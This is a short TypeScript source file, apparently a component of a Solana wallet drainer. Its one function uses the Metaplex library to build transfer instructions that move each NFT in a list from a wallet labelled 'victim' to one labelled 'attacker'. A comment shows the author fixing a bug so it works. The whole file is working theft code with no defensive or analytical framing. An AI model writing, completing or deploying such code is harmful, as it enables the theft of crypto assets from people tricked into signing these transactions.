import { PublicKey, TransactionInstruction } from '@solana/web3.js';
import { Metaplex } from '@metaplex-foundation/js';

export async function createMetaplexTransferIxs(
  victim: PublicKey,
  attacker: PublicKey,
  nfts: any[],
  connection: any
): Promise<TransactionInstruction[]> {

  const instructions: TransactionInstruction[] = [];
  const metaplex = new Metaplex(connection);

  for (const nft of nfts) {
    try {
      if (!nft?.address) continue;

      const nftOrSft = await metaplex.nfts().findByMint({ 
        mintAddress: nft.address 
      });

      const builder = metaplex.nfts().builders().transfer({
        nftOrSft,
        toOwner: attacker,
        fromOwner: victim,
      });

      // Fixed: Use getInstructions() instead of getInstruction()
      const ixs = await builder.getInstructions();
      instructions.push(...ixs);

    } catch (err: any) {
      console.warn(`Failed to create NFT transfer for ${nft.address?.toString()}`, err.message);
    }
  }

  return instructions;
}